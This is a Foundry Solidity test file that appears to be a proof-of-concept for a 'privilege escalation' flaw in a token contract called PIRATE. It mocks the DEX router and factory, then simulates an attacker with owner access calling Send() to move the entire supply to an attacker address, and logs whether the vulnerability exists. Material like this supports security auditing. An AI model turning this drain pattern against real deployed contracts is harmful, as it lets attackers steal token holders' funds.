// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/PIRATE.sol";

contract MockRouterForPirate {
    address factoryAddress;
    address wethAddress;

    constructor() {
        factoryAddress = address(0x000000000000000000000000000000000000Dd);
        wethAddress = address(0x0000000000000000000000000000000000000001);
    }

    function factory() external view returns (address) {
        return factoryAddress;
    }

    function WETH() external view returns (address) {
        return wethAddress;
    }
}

contract MockFactoryForPirate {
    function createPair(address, address) external pure returns (address) {
        return address(0xabc);
    }
}

contract Pirate_PrivilegeEscalation_Test is Test {
    PIRATE pirateToken;
    address deployer = address(0xbeef);
    address attacker = address(0xbad);

    function setUp() public {
        // Setup mocked Uniswap router at expected address
        address expectedRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        MockRouterForPirate mockRouter = new MockRouterForPirate();
        vm.etch(expectedRouter, address(mockRouter).code);
        
        // Setup storage for mocked router
        vm.store(
            expectedRouter,
            bytes32(uint256(0)),
            bytes32(uint256(uint160(0x000000000000000000000000000000000000Dd)))
        );
        vm.store(
            expectedRouter,
            bytes32(uint256(1)),
            bytes32(uint256(uint160(0x0000000000000000000000000000000000000001)))
        );

        // Setup mocked factory
        MockFactoryForPirate mockFactory = new MockFactoryForPirate();
        vm.etch(address(0x000000000000000000000000000000000000Dd), address(mockFactory).code);

        // Deploy token contract
        vm.prank(deployer);
        pirateToken = new PIRATE();
    }

    function test_PrivilegeEscalationViaSend() public {
        uint256 totalSupply = pirateToken.totalSupply();
        uint256 amountToSend = totalSupply / (10 ** pirateToken.decimals());

        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        uint256[] memory values = new uint256[](1);
        values[0] = amountToSend;

        // Differential verification: Before state
        console2.log("--- BEFORE-Trigger Send ---");
        uint256 attackerBalanceBefore = pirateToken.balanceOf(attacker);
        uint256 deployerBalanceBefore = pirateToken.balanceOf(deployer);
        console2.log("Attacker balance pre-Send: ", attackerBalanceBefore);
        console2.log("Deployer balance pre-Send: ", deployerBalanceBefore);
        
        console2.log("--- Trigger Send ---");
        // Simulate attacker gains owner access
        vm.prank(deployer);
        pirateToken.Send(recipients, values);

        // Differential verification: After state
        console2.log("--- AFTER-Trigger Send ---");
        uint256 attackerBalanceAfter = pirateToken.balanceOf(attacker);
        uint256 deployerBalanceAfter = pirateToken.balanceOf(deployer);
        console2.log("Attacker balance post-Send: ", attackerBalanceAfter);
        console2.log("Deployer balance post-Send: ", deployerBalanceAfter);
        
        // Differential comparison and verdict
        bool tokenBalancesChanged = 
            (attackerBalanceAfter > attackerBalanceBefore) && 
            (deployerBalanceAfter < deployerBalanceBefore);
        bool balancesAreExtreme = 
            (attackerBalanceAfter == totalSupply) && 
            (deployerBalanceAfter == 0);
        
        if (tokenBalancesChanged && balancesAreExtreme) {
            console2.log("Vulnerability Exists: Token balances changed illegally - attacker captured all tokens");
        } else {
            console2.log("Vulnerability not Exist: Token balances unchanged within expected constraints");
        }
    }
}